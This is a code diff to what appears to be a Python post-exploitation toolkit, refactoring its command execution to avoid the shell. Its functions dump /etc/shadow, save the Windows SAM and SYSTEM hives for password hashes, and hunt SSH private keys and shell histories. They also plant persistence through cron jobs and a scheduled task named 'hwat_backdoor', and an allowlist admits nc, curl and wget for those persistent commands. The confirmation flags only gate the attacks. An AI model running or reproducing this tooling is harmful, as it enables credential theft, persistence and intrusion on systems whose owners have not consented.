@@ -3,17 +3,83 @@ import getpass
 import json
 import os
 import platform
+import re
+import shlex
 import socket
 import subprocess
-from typing import Optional, List
+from pathlib import Path
+from typing import List, Optional, Sequence, Tuple, Union
 
 
-def run_cmd(cmd):
-    """Run a shell command and return stdout/stderr as string (cross-platform)."""
+_CRON_SCHEDULE_RE = re.compile(r"^[\d\*/,\-]+(\s+[\d\*/,\-]+){4}$")
+_ALLOWED_STATE_CHANGE_BINARIES = {
+    "bash",
+    "sh",
+    "python",
+    "python3",
+    "perl",
+    "ruby",
+    "php",
+    "nc",
+    "netcat",
+    "curl",
+    "wget",
+}
+_ALLOWED_SCHTASK_SCHEDULES = {"MINUTE", "HOURLY", "DAILY", "WEEKLY", "MONTHLY", "ONLOGON", "ONSTART", "ONIDLE", "ONCE"}
+
+
+def _run_argv(argv: Sequence[str], *, input_text: Optional[str] = None) -> Tuple[int, str]:
     try:
-        return subprocess.getoutput(cmd)
+        result = subprocess.run(
+            list(argv),
+            shell=False,
+            check=False,
+            capture_output=True,
+            text=True,
+            input=input_text,
+        )
+        stdout = (result.stdout or "").strip()
+        stderr = (result.stderr or "").strip()
+        if stdout and stderr:
+            return result.returncode, f"{stdout}\n{stderr}"
+        return result.returncode, stdout or stderr
+    except Exception as e:
+        return 1, str(e)
+
+
+def run_cmd(cmd: Union[Sequence[str], str]):
+    """Run a command safely without a shell and return stdout/stderr text."""
+
+    try:
+        argv = shlex.split(cmd) if isinstance(cmd, str) else list(cmd)
+        if not argv:
+            return ""
+        _rc, out = _run_argv(argv)
+        return out
     except Exception as e:
         return str(e)
+
+
+def _run_fallback(commands: Sequence[Sequence[str]]) -> str:
+    last_out = ""
+    for cmd in commands:
+        rc, out = _run_argv(cmd)
+        if rc == 0 and out:
+            return out
+        if out:
+            last_out = out
+    return last_out
+
+
+def _is_allowed_state_change_command(cmd: str) -> bool:
+    try:
+        tokens = shlex.split(cmd)
+    except Exception:
+        return False
+    if not tokens:
+        return False
+    head = os.path.basename(tokens[0]).lower()
+    return head in _ALLOWED_STATE_CHANGE_BINARIES
 
 
 def is_windows():
@@ -36,7 +102,7 @@ def get_system_info_unix():
         "release": platform.release(),
         "version": platform.version(),
         "architecture": platform.machine(),
-        "kernel": run_cmd("uname -a"),
+        "kernel": run_cmd(["uname", "-a"]),
         "whoami": getpass.getuser(),
     }
 
@@ -50,9 +116,9 @@ def get_system_info_windows():
     try:
         info["hostname"] = socket.gethostname()
     except Exception:
-        info["hostname"] = run_cmd("hostname")
-    info["whoami"] = run_cmd("whoami")
-    info["systeminfo"] = run_cmd("systeminfo")
+        info["hostname"] = run_cmd(["hostname"])
+    info["whoami"] = run_cmd(["whoami"])
+    info["systeminfo"] = run_cmd(["systeminfo"])
     return info
 
 
@@ -61,13 +127,13 @@ def get_users():
 
 
 def get_users_unix():
-    return run_cmd("cat /etc/passwd")
+    return run_cmd(["cat", "/etc/passwd"])
 
 
 def get_users_windows():
     out = {}
-    out["net_users"] = run_cmd("net user")
-    out["local_groups"] = run_cmd("net localgroup")
+    out["net_users"] = run_cmd(["net", "user"])
+    out["local_groups"] = run_cmd(["net", "localgroup"])
     return out
 
 
@@ -76,11 +142,11 @@ def get_processes():
 
 
 def get_processes_unix():
-    return run_cmd("ps aux")
+    return run_cmd(["ps", "aux"])
 
 
 def get_processes_windows():
-    return run_cmd("tasklist /v")
+    return run_cmd(["tasklist", "/v"])
 
 
 def get_network_info():
@@ -88,44 +154,52 @@ def get_network_info():
 
 
 def get_network_info_unix():
-    return run_cmd("netstat -tunlp 2>/dev/null || ss -tunlp")
+    return _run_fallback((
+        ["netstat", "-tunlp"],
+        ["ss", "-tunlp"],
+    ))
 
 
 def get_network_info_windows():
-    return {"ipconfig": run_cmd("ipconfig /all"), "netstat": run_cmd("netstat -ano")}
+    return {"ipconfig": run_cmd(["ipconfig", "/all"]), "netstat": run_cmd(["netstat", "-ano"])}
 
 
 def check_sudo_rights():
     if is_windows():
         return check_privileges_windows()
-    return run_cmd("sudo -l")
+    return run_cmd(["sudo", "-l"])
 
 
 def check_privileges_windows():
     out = {}
-    out["whoami"] = run_cmd("whoami /priv")
-    out["groups"] = run_cmd("whoami /groups")
-    out["user"] = run_cmd("whoami")
+    out["whoami"] = run_cmd(["whoami", "/priv"])
+    out["groups"] = run_cmd(["whoami", "/groups"])
+    out["user"] = run_cmd(["whoami"])
     return out
 
 
 def find_suid_bins():
     if is_windows():
         return "Not applicable on Windows (use find services/scripts instead)"
-    return run_cmd("find / -perm -4000 -type f 2>/dev/null")
+    return run_cmd(["find", "/", "-perm", "-4000", "-type", "f"])
 
 
 def check_kernel_exploits():
     """Return kernel / OS version string for manual lookup against exploit databases."""
     if is_windows():
-        return run_cmd("ver") + "\n" + run_cmd('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"')
-    return run_cmd("uname -r")
+        return f"{run_cmd(['ver'])}\n{run_cmd(['systeminfo'])}"
+    return run_cmd(["uname", "-r"])
 
 
 def search_ssh_keys():
     if is_windows():
         return search_ssh_keys_windows()
-    return run_cmd("find /home -name id_rsa 2>/dev/null || find / -name id_rsa 2>/dev/null")
+
+    # Prefer scoped search first to reduce noisy permission errors.
+    out = run_cmd(["find", "/home", "-name", "id_rsa"])
+    if out:
+        return out
+    return run_cmd(["find", "/", "-name", "id_rsa"])
 
 
 def search_ssh_keys_windows():
@@ -136,22 +210,47 @@ def search_ssh_keys_windows():
         os.path.join(users_dir, "*", ".ssh", "id_ed25519"),
     ]
     for c in candidates:
-        locations.append(run_cmd(f'dir /b /s "{c}" 2>nul'))
+        locations.append(run_cmd(["cmd", "/c", f"dir /b /s \"{c}\""]))
     return "\n".join(locations)
 
 
 def search_config_files():
     if is_windows():
-        return run_cmd('dir /s /b %USERPROFILE%\\*.config 2>nul || dir /s /b %USERPROFILE%\\*.xml 2>nul')
-    return run_cmd("find / -name '*.conf' -o -name '*.ini' -o -name '*.yaml' 2>/dev/null")
+        return _run_fallback((
+            ["cmd", "/c", r"dir /s /b %USERPROFILE%\*.config"],
+            ["cmd", "/c", r"dir /s /b %USERPROFILE%\*.xml"],
+        ))
+    return run_cmd(["find", "/", "-name", "*.conf", "-o", "-name", "*.ini", "-o", "-name", "*.yaml"])
 
 
 def search_history():
     if is_windows():
         return run_cmd(
-            'cmd /c "for %f in (%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\Microsoft.PowerShell_* ) do @type %f 2>nul"'
+            [
+                "powershell",
+                "-NoProfile",
+                "-Command",
+                r"Get-ChildItem $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Microsoft.PowerShell_* -ErrorAction SilentlyContinue | Get-Content -ErrorAction SilentlyContinue",
+            ]
         )
-    return run_cmd("cat /home/*/.bash_history 2>/dev/null || cat ~/.bash_history 2>/dev/null")
+
+    lines: List[str] = []
+    for home in Path("/home").glob("*"):
+        hist = home / ".bash_history"
+        if hist.is_file():
+            try:
+                lines.extend(hist.read_text(encoding="utf-8", errors="ignore").splitlines())
+            except Exception:
+                pass
+
+    current = Path.home() / ".bash_history"
+    if current.is_file():
+        try:
+            lines.extend(current.read_text(encoding="utf-8", errors="ignore").splitlines())
+        except Exception:
+            pass
+
+    return "\n".join(lines)
 
 
 def add_cronjob(cmd, schedule="* * * * *"):
@@ -163,15 +262,28 @@ def add_cronjob(cmd, schedule="* * * * *"):
 def add_cronjob_confirmed(cmd, schedule="* * * * *", *, confirm: bool = False):
     """Add a cronjob (state-changing).
 
-    Safer default: requires confirm=True.
+    Safer default: requires confirm=True and validated allowlisted command.
     """
 
     if not confirm:
         return "[-] Refusing to modify crontab without confirm=True"
+    if not _CRON_SCHEDULE_RE.fullmatch(str(schedule).strip()):
+        return "[-] Refusing to modify crontab: invalid cron schedule format"
+    if not _is_allowed_state_change_command(cmd):
+        return "[-] Refusing to modify crontab: command is not in allowlist"
+
     try:
-        cron_entry = f"{schedule} {cmd}\n"
-        run_cmd(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -')
-        return "[+] Cronjob added."
+        list_rc, existing = _run_argv(["crontab", "-l"])
+        if list_rc != 0:
+            existing = ""
+
+        cron_entry = f"{schedule} {cmd}".rstrip() + "\n"
+        new_crontab = (existing + "\n" + cron_entry).strip() + "\n"
+
+        rc, out = _run_argv(["crontab", "-"], input_text=new_crontab)
+        if rc == 0:
+            return "[+] Cronjob added."
+        return f"[-] Failed to add cronjob: {out}"
     except Exception as e:
         return f"[-] Failed to add cronjob: {e}"
 
@@ -183,13 +295,20 @@ def add_schtask(cmd, name="hwat_backdoor", schedule="MINUTE"):
 def add_schtask_confirmed(cmd, name="hwat_backdoor", schedule="MINUTE", *, confirm: bool = False):
     """Add a scheduled task (state-changing).
 
-    Safer default: requires confirm=True.
+    Safer default: requires confirm=True and validated allowlisted command.
     """
 
     if not confirm:
         return "[-] Refusing to create a scheduled task without confirm=True"
+    if not _is_allowed_state_change_command(cmd):
+        return "[-] Refusing to create scheduled task: command is not in allowlist"
+
+    normalized = str(schedule or "").upper().strip()
+    if normalized not in _ALLOWED_SCHTASK_SCHEDULES:
+        return "[-] Refusing to create scheduled task: invalid schedule"
+
     try:
-        return run_cmd(f'schtasks /Create /SC {schedule} /TN "{name}" /TR "{cmd}" /F')
+        return run_cmd(["schtasks", "/Create", "/SC", normalized, "/TN", str(name), "/TR", str(cmd), "/F"])
     except Exception as e:
         return str(e)
 
@@ -220,17 +339,16 @@ def backdoor_ssh_confirmed(pubkey, *, confirm: bool = False):
 
 
 def find_network_shares():
-    return (
-        run_cmd("showmount -e 2>/dev/null || smbclient -L localhost -N 2>/dev/null")
-        if not is_windows()
-        else run_cmd("net view /all")
-    )
+    return _run_fallback((
+        ["showmount", "-e"],
+        ["smbclient", "-L", "localhost", "-N"],
+    )) if not is_windows() else run_cmd(["net", "view", "/all"])
 
 
 def dump_passwd_shadow():
     if is_windows():
         return "Not applicable on Windows; see registry hives functions"
-    return run_cmd("cat /etc/shadow 2>/dev/null")
+    return run_cmd(["cat", "/etc/shadow"])
 
 
 def extract_hashes_windows(save_dir=None):
@@ -247,40 +365,73 @@ def extract_hashes_windows_confirmed(save_dir=None, *, confirm: bool = False):
         return "[-] Refusing to save registry hives without confirm=True"
     if not is_windows():
         return "Windows-only function."
+
     out = {}
     if save_dir:
         os.makedirs(save_dir, exist_ok=True)
-        out["SAM"] = run_cmd(f'reg save HKLM\\SAM "{os.path.join(save_dir, "SAM")}" 2>&1')
-        out["SYSTEM"] = run_cmd(f'reg save HKLM\\SYSTEM "{os.path.join(save_dir, "SYSTEM")}" 2>&1')
+        sam_path = os.path.join(save_dir, "SAM")
+        system_path = os.path.join(save_dir, "SYSTEM")
     else:
-        out["SAM"] = run_cmd("reg save HKLM\\SAM sam_backup 2>&1")
-        out["SYSTEM"] = run_cmd("reg save HKLM\\SYSTEM system_backup 2>&1")
+        sam_path = "sam_backup"
+        system_path = "system_backup"
+
+    out["SAM"] = run_cmd(["reg", "save", r"HKLM\SAM", sam_path])
+    out["SYSTEM"] = run_cmd(["reg", "save", r"HKLM\SYSTEM", system_path])
     return out
 
 
 def list_services_windows():
     if not is_windows():
         return "Windows-only"
-    return run_cmd("sc query type= service state= all")
+    return run_cmd(["sc", "query", "type=", "service", "state=", "all"])
 
 
 def list_scheduled_tasks():
     if is_windows():
-        return run_cmd("schtasks /query /fo LIST /v")
-    return run_cmd("crontab -l 2>/dev/null || cat /etc/cron*/* 2>/dev/null")
+        return run_cmd(["schtasks", "/query", "/fo", "LIST", "/v"])
+
+    scheduled = run_cmd(["crontab", "-l"])
+    cron_lines = ["## user crontab", scheduled or ""]
+    cron_dirs = ["/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly", "/etc/cron.weekly", "/etc/cron.monthly"]
+
+    for d in cron_dirs:
+        p = Path(d)
+        if not p.exists() or not p.is_dir():
+            continue
+        for f in sorted(p.iterdir()):
+            if not f.is_file():
+                continue
+            try:
+                cron_lines.append(f"\n## {f}")
+                cron_lines.append(f.read_text(encoding="utf-8", errors="ignore"))
+            except Exception:
+                continue
+
+    return "\n".join(cron_lines).strip()
 
 
 def enum_installed_programs_windows():
     if not is_windows():
         return "Windows-only"
-    return run_cmd('wmic product get name,version 2>nul || powershell "Get-WmiObject -Class Win32_Product | Select-Object Name,Version"')
+
+    out = run_cmd(["wmic", "product", "get", "name,version"])
+    if out:
+        return out
+    return run_cmd(
+        [
+            "powershell",
+            "-NoProfile",
+            "-Command",
+            "Get-WmiObject -Class Win32_Product | Select-Object Name,Version",
+        ]
+    )
 
 
 def enum_weak_services_windows():
     if not is_windows():
         return "Windows-only"
-    raw = run_cmd("sc queryex type= service state= all")
-    cfg = run_cmd("wmic service get Name,DisplayName,PathName,StartMode,State /format:list")
+    raw = run_cmd(["sc", "queryex", "type=", "service", "state=", "all"])
+    cfg = run_cmd(["wmic", "service", "get", "Name,DisplayName,PathName,StartMode,State", "/format:list"])
     return {"raw_services": raw, "service_configs": cfg}
 
 
@@ -305,7 +456,7 @@ def find_common_windows_credentials():
 def full_recon():
     report = {}
     report["system_info"] = get_system_info()
-    report["whoami_priv"] = check_privileges_windows() if is_windows() else run_cmd("id")
+    report["whoami_priv"] = check_privileges_windows() if is_windows() else run_cmd(["id"])
     report["sudo_rights"] = check_sudo_rights()
     report["suid_bins"] = find_suid_bins() if not is_windows() else None
     report["kernel_version"] = check_kernel_exploits()
